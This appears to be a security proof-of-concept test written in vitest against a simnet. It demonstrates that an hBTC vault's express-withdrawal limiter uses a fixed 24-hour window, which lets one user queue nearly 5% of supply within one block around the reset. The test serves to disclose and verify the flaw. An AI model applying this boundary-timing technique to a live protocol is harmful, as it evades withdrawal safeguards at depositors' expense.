// Security PoC: hBTC express withdrawal fixed-window boundary bypass
import { describe, it, expect, beforeEach } from 'vitest';
import {
  vault,
  state,
  hbtcToken,
  deployer,
  user1,
  user2,
  ONE_BTC,
  txOk,
  rov,
  initProtocol,
  mineBlocks,
} from '../helpers/setup.js';

beforeEach(() => {
  initProtocol();
});

describe('hBTC express 24h boundary PoC', () => {
  it('accepts nearly 5% of supply as express requests across one fixed-window boundary', () => {
    // initProtocol disables the express limiter for generic tests; re-enable the
    // production control for this PoC.
    txOk(state.setExpressLimitEnabled(true), deployer);

    // Build 200 BTC of share supply. user1 owns enough shares to consume two
    // complete 2.5% windows by itself.
    txOk(vault.deposit(100n * ONE_BTC, null), user1);
    txOk(vault.deposit(100n * ONE_BTC, null), user2);

    const supplyResp = rov(hbtcToken.getTotalSupply());
    const totalSupply = supplyResp.value as bigint;
    const quota = (totalSupply * 250n) / 10_000n; // 2.5%

    expect(totalSupply).toBe(200n * ONE_BTC);
    expect(quota).toBe(5n * ONE_BTC);

    // Start a fresh express window with the minimum redeem amount. This fixes
    // last-express-ts and leaves almost the entire 2.5% quota available.
    const anchor = 100n;
    txOk(vault.requestRedeem(anchor, true), user1);
    expect(rov(state.getCurrentExpressLimit())).toBe(quota - anchor);

    // Simnet advances ~523 seconds per empty block. 165 blocks are still just
    // inside the 86,400-second window; one additional block crosses it.
    mineBlocks(165);

    // Consume the rest of the old window immediately before reset.
    const oldWindowBurst = quota - anchor;
    txOk(vault.requestRedeem(oldWindowBurst, true), user1);
    expect(rov(state.getCurrentExpressLimit())).toBe(0n);

    // Cross the fixed-window boundary (~8.7 minutes later at most) and consume
    // a completely new 2.5% quota.
    mineBlocks(1);
    const newWindowBurst = quota;
    txOk(vault.requestRedeem(newWindowBurst, true), user1);

    // The two large requests are separated by only one block but total almost
    // 5% of total supply, contradicting a rolling "2.5% within any 24 hours"
    // limit. Both claims are real, non-cancellable express claims backed by
    // escrowed hBTC shares.
    const burst = oldWindowBurst + newWindowBurst;
    expect(burst).toBe((10n * ONE_BTC) - anchor);
    expect(burst * 10_000n).toBeGreaterThan(totalSupply * 499n); // >4.99%
  });
});
